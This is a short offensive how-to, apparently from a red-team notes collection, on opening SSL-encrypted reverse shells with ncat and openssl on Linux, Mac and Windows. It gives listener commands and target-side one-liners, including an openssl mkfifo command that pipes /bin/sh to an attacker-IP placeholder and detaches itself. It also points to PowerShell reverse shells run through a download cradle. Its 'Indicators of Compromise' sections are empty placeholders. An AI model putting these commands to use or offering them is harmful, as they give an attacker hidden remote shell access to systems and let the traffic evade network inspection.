# Netcat with SSL
## Summary

This will outline how to use a normal netcat shell except the traffic is encrypted with SSL.

## Prerequisites

Any operating system that has NMAP support, as the ncat package is shipped with NMAP.

## Setup

Install NMAP and ensure the ncat command is present

## Execution

### Method 1 - Reverse Shell Listener Linux/Mac

Start up the reverse shell listener with the following command:

```bash
ncat --ssl -lvnp <port>
```

If the target has ncat as well, run the following command on the target:

```bash
ncat --ssl <attacker ip> <attcker port>
```

Otherwise, if they have openssl on linux/mac, use the following command:

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | openssl s_client -connect <attacker ip>:<attacker port> 2>&1 > /tmp/f & disown
```

#### Indicators of Compromise

TODO

### Method 2 - Reverse Shell Listener Windows

I highly recommend you use the following command, but if you don't want or need `rlwrap`, simply omit it from the following command:

```bash
rlwrap ncat --ssl -lvnp <port>
```

If the target has ncat as well, run the following command on the target:

```bash
ncat --ssl <attacker ip> <attcker port>
```

Otherwise, you can use [these](https://github.com/nukingdragons/RevShells) powershell reverse shells, either "TCPReverseSSL-AddType" or "TCPReverseShell-Reflective" (AddType drops stuff to disk, reflective is less portable and may require tinkering), and then run them through a powershell cradle or otherwise to fetch a reverse shell.

#### Indicators of Compromise

TODO